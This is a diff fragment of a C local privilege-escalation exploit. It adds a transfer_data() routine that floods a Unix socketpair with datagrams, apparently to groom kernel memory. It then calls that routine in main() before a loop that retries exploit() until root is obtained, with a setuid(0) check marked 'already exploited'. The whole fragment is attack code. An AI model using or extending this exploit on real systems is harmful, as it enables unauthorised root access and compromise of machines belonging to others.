@@ -958,10 +958,29 @@ int exploit()
     return 0;
 }
 
+void transfer_data()
+{
+    int sock[2] = {-1, -1};
+    socketpair(AF_UNIX, SOCK_DGRAM, 0, sock);
+    char buf[128];
+    for(int i = 0; i < 128; i++)
+        buf[i] = i;
+    for(int i = 0; i < 512; i++)
+    {
+        for(int j = 0; j < 8; j++)
+            sendto(sock[0], buf, 128, 0, 0, 0);
+        for(int j = 0; j < 8; j++)
+            recvfrom(sock[1], buf, 128, 0, 0, 0);
+    }
+    for(int i = 0; i < 5; i++)
+        sendto(sock[0], buf, 128, 0, 0, 0);
+}
+
 int main()
 {
     if(!setuid(0)) //already exploited
         return 179;
+    transfer_data();
     kp_bad_fds = kp_bad_fds_end = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     int ans;
     while((ans = exploit()) == 1);
